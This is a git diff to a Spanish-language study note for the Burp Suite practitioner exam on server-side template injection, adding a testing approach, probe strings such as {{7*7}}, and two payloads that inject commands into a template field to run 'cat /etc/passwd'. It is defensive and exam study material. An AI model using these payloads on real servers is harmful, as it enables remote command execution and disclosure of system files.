@@ -1,5 +1,12 @@
 ![imagen](https://github.com/KrakenEU/BSCP/assets/80364768/04ebf58a-e6c7-463e-9593-126d84ad57c8)
+- Siempre intentaremos causar un error escribiendo cualquier cosa en la zona de la plantilla o similares para ver si el error nos devuelve la version / engine que se utiliza en la plantilla, y luego ya...
 
+--> PAYLOADS:
+[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection]
+--> URL-ENCODER:
+[https://www.urlencoder.org/]
+
+Simple:
 ```
 {{7*7}}
 ${7*7}
@@ -7,6 +14,14 @@ ${7*7}
 ${{7*7}}
 #{7*7}
 ```
+
+SomePayloads:
+```
+Read File --- <%= system('cat /etc/passwd') %>
+CerrarQuery+ConcatenarOtra -- user.first_name}}{%import os%}{{os.system('cat /etc/passwd')}}
+```
+
+
 Use the intruder to test payloads
 check errors and move forward, search for exploits, etc.
 ```
